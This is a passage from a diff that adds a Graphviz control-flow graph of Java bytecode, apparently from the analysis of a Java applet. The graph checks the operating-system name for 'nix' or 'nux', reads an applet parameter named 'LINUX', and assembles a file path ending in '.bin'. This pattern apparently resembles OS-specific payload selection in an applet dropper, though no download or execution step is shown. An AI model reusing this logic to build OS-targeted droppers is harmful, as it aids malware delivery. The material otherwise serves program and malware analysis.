+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"load.r r73";
+    "load.r r73"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r1";
+    "load.r r1"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \".bin\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \".bin\"";
+    "push \".bin\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"store.r r73";
+    "store.r r73"->"goto load.r r74";
+    "iflt load.r r3"->"load.r r3";
+    "push \"nix\""
+    "load.r r3"->"push \"nix\"";
+    "push \"nix\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
+    "ifge load.r r0"
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"ifge load.r r0";
+    "ifge load.r r0"->"load.r r3";
+    "push \"nux\""
+    "load.r r3"->"push \"nux\"";
+    "push \"nux\""->"virtualinvoke <java.lang.String: int indexOf(java.lang.String)>";
+    "iflt load.r r74"
+    "virtualinvoke <java.lang.String: int indexOf(java.lang.String)>"->"iflt load.r r74";
+    "iflt load.r r74"->"load.r r0";
+    "push \"LINUX\""
+    "load.r r0"->"push \"LINUX\"";
+    "push \"LINUX\""->"virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>";
+    "virtualinvoke <Java: java.lang.String getParameter(java.lang.String)>"->"store.r r74";
+    "store.r r74"->"push 2";
+    "push 2"->"store.b b17";
+    "store.b b17"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"load.r r73";
+    "load.r r73"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"load.r r1";
+    "load.r r1"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \".bin\"";
+    "push \".bin\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"store.r r73";
+}
